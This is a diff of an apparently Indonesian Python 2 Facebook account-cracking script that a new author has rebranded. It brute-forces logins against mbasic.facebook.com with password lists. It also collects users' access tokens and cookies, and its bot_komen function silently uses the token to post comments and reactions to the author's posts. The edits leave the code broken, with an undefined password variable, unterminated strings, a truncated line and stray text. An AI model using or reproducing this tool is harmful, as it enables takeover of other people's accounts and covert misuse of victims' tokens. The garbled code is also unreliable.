@@ -2,7 +2,7 @@
 # coded by Nikyi.py
 # fb.me/Nikyi.py
 # instagram.com/Nikipratama307
-# open source, tidak di perjual belikan
+# 
 
 try:
 	import requests
@@ -504,7 +504,7 @@ def manual():
 			pass
 		try:
 			for asu in pw.split(","):
-				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua})
+				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': kontol, 'login': 'submit'}, headers={'user-agent': ua})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
 					print('\r  \033[0;92m* --> ' +uid+ '|' + asu + '       ')
@@ -563,7 +563,7 @@ def settua():
 			exit()
 	elif ask == "t" or ask == "T":
 		try:
-			ua = s.get("https://raw.githubusercontent.com/avsid/data-anggaxd/main/ua.txt").text.strip()
+			ua = s.get("https://raw.githubusercontent.com/avsid/data-Nikicrk.x/main/ua.txt").text.strip()
 			uas = open(".ua","w")
 			uas.write(ua) 
 			uas.close()
@@ -633,7 +633,7 @@ op = bulan[nTemp]
 
 def logo():
 	os.system("clear")
-	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")
+	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  __| \033[0;96mAU\033[0;97m : NIKYI.PY\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/Nikyi.py\n\033[0;97m |___  \033[0;93mGH\033[0;97m : GITHUB.COM/Nikicrk.x")
 
 def bot_komen():
     try:
@@ -644,8 +644,8 @@ def bot_komen():
     una = ('100015073506062') 
     post = ('1031861840659590') 
     post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
-    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
+    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nh https://www.facebook.com/100068397981838/posts/112380884385177/?app=fbl
+    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nh https://www.facebook.com/100068397981838/posts/112380884385177/?app=fbl
     reac = ('LOVE') 
     requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
@@ -682,7 +682,7 @@ def cookie():
 	cookie = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Cookie : \033[0;96m")
 	try:
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
-		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
+		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
 		'referer'                   : 'https://m.facebook.com/',
 		'host'                      : 'm.facebook.com',
 		'origin'                    : 'https://m.facebook.com',
@@ -710,8 +710,7 @@ def tokenz():
 		menu()
 	except (KeyError,IOError):
 		logo()
-		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be/RIpCHs7E4qs")
-		token = raw_input(" \033[0;97m[\033[0;92m+\033[0;97m] Your Token : \033[0;96m")
+		print("\n \033[0;97m[\033[0;93m*\033[0;97m] How To Get Token : https://youtu.be 
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			a = json.loads(otw.text)
@@ -1165,3 +1164,4 @@ if __name__ == '__main__':
 		exit(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python2 run.py")
 	os.system("git pull")
 	login()
+Token
